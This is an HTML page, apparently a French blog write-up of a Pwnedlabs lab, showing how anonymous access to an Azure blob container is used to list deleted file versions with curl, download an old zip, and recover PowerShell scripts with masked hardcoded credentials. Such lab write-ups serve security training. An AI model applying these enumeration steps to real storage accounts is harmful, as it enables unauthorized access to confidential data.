@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  
+    <title>☁️ - Azure Blob Container to Initial Access :: Blog | Hadrien</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Exploitation d&#39;un **accès anonyme** sur un **blob de stockage** Azure" />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="//localhost:1313/posts/azure_blob_container_to_initial_access/" />
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="//localhost:1313/styles.css">
+
+
+
+
+
+
+
+  <link rel="shortcut icon" href="//localhost:1313/img/theme-colors/red.png">
+  <link rel="apple-touch-icon" href="//localhost:1313/img/theme-colors/red.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="☁️ - Azure Blob Container to Initial Access">
+<meta property="og:description" content="Exploitation d&#39;un **accès anonyme** sur un **blob de stockage** Azure" />
+<meta property="og:url" content="//localhost:1313/posts/azure_blob_container_to_initial_access/" />
+<meta property="og:site_name" content="Blog | Hadrien" />
+
+  
+    <meta property="og:image" content="//localhost:1313/img/favicon/red.png">
+  
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2025-02-11 15:32:11 &#43;0100 CET" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="red">
+
+
+<div class="container full headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Home | Accueil
+  </div>
+</a>
+
+    </div>
+    
+    
+  </div>
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="//localhost:1313/posts/azure_blob_container_to_initial_access/">☁️ - Azure Blob Container to Initial Access</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2025-02-11</time><span class="post-author">Hadrien C</span><span class="post-reading-time">3 min read (583 words)</span></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="//localhost:1313/tags/pwnedlabs/">pwnedlabs</a>&nbsp;
+      
+      #<a href="//localhost:1313/tags/aad/">AAD</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <p><em>N&rsquo;ayant jamais fait d&rsquo;Azure dans un contexte offsec, il est possible qu&rsquo;il y ait des erreurs dans ce writeup, n&rsquo;hésitez pas à me contacter pour les remonter :)</em></p>
+<p><em>Aucun mot de passe ni flag ne sera publié dans ce writeup</em></p>
+<h2 id="scénario-du-challenge-">Scénario du challenge :<a href="#scénario-du-challenge-" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>L&rsquo;entreprise &ldquo;Mega Big Tech&rdquo; utilise une architecture cloud hybride avec un domaine Active Directory sur site et Azure.
+En raison de son importance dans la tech, elle craint des cyberattaques et demande une évaluation de la sécurité de son infrastructure, incluant ses services cloud. Une URL trouvée dans une documentation publique doit être analysée.</p>
+<p>Globalement, le but ici est de récupérer des informations confidentielles stockées sur un blob Azure.</p>
+<h2 id="-enumération">🔍 Enumération<a href="#-enumération" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Pwnedlabs nous fourni une URL : &ldquo;<a href="http://dev.megabigtech.com/$web/index.html%22">http://dev.megabigtech.com/$web/index.html"</a></p>
+<p><img alt="website" src="/azure_blob_container_to_initial_access/website.png"></p>
+<p>En regardant les différentes ressources récupérées par l&rsquo;application web, on remarque que l&rsquo;application utilise un blob azure pour stocker des ressources (images, fichier javascript, etc&hellip;).</p>
+<p>Pour rappel voici la liste des services de stockage Azure avec les URLs associés.</p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">Storage service</th>
+          <th style="text-align: left">Endpoint</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left">Blob Storage</td>
+          <td style="text-align: left">https://&ldquo;storage-account&rdquo;.blob.core.windows.net</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">Data Lake Storage</td>
+          <td style="text-align: left">https://&ldquo;storage-account&rdquo;.dfs.core.windows.net</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">Static website (Blob Storage)</td>
+          <td style="text-align: left">https://&ldquo;storage-account&rdquo;.web.core.windows.net</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">Azure Files</td>
+          <td style="text-align: left">https://&ldquo;storage-account&rdquo;.file.core.windows.net</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">Queue Storage</td>
+          <td style="text-align: left">https://&ldquo;storage-account&rdquo;.queue.core.windows.net</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">Table Storage</td>
+          <td style="text-align: left">https://&ldquo;storage-account&rdquo;.table.core.windows.net</td>
+      </tr>
+  </tbody>
+</table>
+<p>En lisant plusieurs documentations, je comprendre que l&rsquo;URL est donc sous cette forme :
+<code>https://mbtwebsite.blob.core.windows.net/$web/&lt;fichiers&gt;</code></p>
+<ul>
+<li><strong>Nom du compte de stockage Azure</strong> : <code>mbtwebsite</code></li>
+<li><strong>Le nom du conteneur qui héberge le site web</strong> : <code>$web</code></li>
+</ul>
+<h3 id="todo-">todo :<a href="#todo-" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<ul>
+<li>expliquer le principe des versions des fichiers dans azure</li>
+<li>expliquer comment jouer avec les verions des fichiers</li>
+</ul>
+<p>Regarder les fichiers supprimés :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl <span style="color:#e6db74">&#39;https://mbtwebsite.blob.core.windows.net/$web/?restype=container&amp;comp=list&amp;include=versions&#39;</span> -H <span style="color:#e6db74">&#39;x-ms-version: 2019-12-12&#39;</span> | xmllint --format - &gt; all_version_id.xml
+</span></span></code></pre></div><p>Après avoir identifié un fichier zip, on peux le télécharger :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl <span style="color:#e6db74">&#39;https://mbtwebsite.blob.core.windows.net/$web/scripts-transfer.zip?versionid=2024-03-29T20:55:40.8265593Z&#39;</span> -H <span style="color:#e6db74">&#39;x-ms-version: 2019-12-12&#39;</span> --output scripts-transfer.zip
+</span></span></code></pre></div><p>En l&rsquo;ouvrant, on constate qu&rsquo;il contient 2 scripts powershell :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span><span style="color:#75715e"># Install the required modules if not already installed</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Install-Module -Name Az -Force -Scope CurrentUser</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Install-Module -Name MSAL.PS -Force -Scope CurrentUser</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Import the required modules</span>
+</span></span><span style="display:flex;"><span>Import-Module Az
+</span></span><span style="display:flex;"><span>Import-Module MSAL.PS
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Define your Azure AD credentials</span>
+</span></span><span style="display:flex;"><span>$Username = <span style="color:#e6db74">&#34;marcus@megabigtech.com&#34;</span>
+</span></span><span style="display:flex;"><span>$Password = <span style="color:#e6db74">&#34;Th*************&#34;</span> | ConvertTo-SecureString -AsPlainText -Force
+</span></span><span style="display:flex;"><span>$Credential = New-Object System.Management.Automation.PSCredential ($Username, $Password)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Authenticate to Azure AD using the specified credentials</span>
+</span></span><span style="display:flex;"><span>Connect-AzAccount -Credential $Credential
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Define the Microsoft Graph API URL</span>
+</span></span><span style="display:flex;"><span>$GraphApiUrl = <span style="color:#e6db74">&#34;https://graph.microsoft.com/v1.0/users?</span>$select<span style="color:#e6db74">=displayName,userPrincipalName&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Retrieve the access token for Microsoft Graph</span>
+</span></span><span style="display:flex;"><span>$AccessToken = (Get-AzAccessToken -ResourceType MSGraph).Token
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Create a headers hashtable with the access token</span>
+</span></span><span style="display:flex;"><span>$headers = @{
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Authorization&#34;</span> = <span style="color:#e6db74">&#34;Bearer </span>$AccessToken<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;ContentType&#34;</span>   = <span style="color:#e6db74">&#34;application/json&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Retrieve User Information and Last Sign-In Time using Microsoft Graph via PowerShell</span>
+</span></span><span style="display:flex;"><span>$response = Invoke-RestMethod -Uri $GraphApiUrl -Method Get -Headers $headers
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Output the response (formatted as JSON)</span>
+</span></span><span style="display:flex;"><span>$response | ConvertTo-Json
+</span></span></code></pre></div><p>et</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span><span style="color:#75715e"># Define the target domain and OU</span>
+</span></span><span style="display:flex;"><span>$domain = <span style="color:#e6db74">&#34;megabigtech.local&#34;</span>
+</span></span><span style="display:flex;"><span>$ouName = <span style="color:#e6db74">&#34;Review&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Set the threshold for stale computer accounts (adjust as needed)</span>
+</span></span><span style="display:flex;"><span>$staleDays = <span style="color:#ae81ff">90</span>  <span style="color:#75715e"># Computers not modified in the last 90 days will be considered stale</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Hardcoded credentials</span>
+</span></span><span style="display:flex;"><span>$securePassword = ConvertTo-SecureString <span style="color:#e6db74">&#34;Me******&#34;</span> -AsPlainText -Force
+</span></span><span style="display:flex;"><span>$credential = New-Object System.Management.Automation.PSCredential (<span style="color:#e6db74">&#34;mar*****&#34;</span>, $securePassword)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Get the current date</span>
+</span></span><span style="display:flex;"><span>$currentDate = Get-Date
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Calculate the date threshold for stale accounts</span>
+</span></span><span style="display:flex;"><span>$thresholdDate = $currentDate.AddDays(-$staleDays)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Disable and move stale computer accounts to the &#34;Review&#34; OU</span>
+</span></span><span style="display:flex;"><span>Get-ADComputer -Filter {(LastLogonTimeStamp <span style="color:#f92672">-lt</span> $thresholdDate) <span style="color:#f92672">-and</span> (Enabled <span style="color:#f92672">-eq</span> $true)} -SearchBase <span style="color:#e6db74">&#34;DC=</span>$domain<span style="color:#e6db74">&#34;</span> -Properties LastLogonTimeStamp -Credential $credential |
+</span></span><span style="display:flex;"><span>  ForEach-Object {
+</span></span><span style="display:flex;"><span>    $computerName = $_.Name
+</span></span><span style="display:flex;"><span>    $computerDistinguishedName = $_.DistinguishedName
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Disable the computer account</span>
+</span></span><span style="display:flex;"><span>    Disable-ADAccount -Identity $computerDistinguishedName -Credential $credential
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Move the computer account to the &#34;Review&#34; OU</span>
+</span></span><span style="display:flex;"><span>    Move-ADObject -Identity $computerDistinguishedName -TargetPath <span style="color:#e6db74">&#34;OU=</span>$ouName<span style="color:#e6db74">,DC=</span>$domain<span style="color:#e6db74">&#34;</span> -Credential $credential
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    Write-Host <span style="color:#e6db74">&#34;Disabled and moved computer account: </span>$computerName<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>  }
+</span></span></code></pre></div><p>Avec les différentes informations de récupérées, nous pouvons nous connecter au portail Azure afin de s&rsquo;authentifier.</p>
+<!-- raw HTML omitted -->
+
+      </div></div>
+
+  
+    
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h"></span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        
+        <span class="button next">
+            <a href="//localhost:1313/posts/1/">
+                <span class="button__text">📦 Machine Baby - Vulnlab</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2025 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
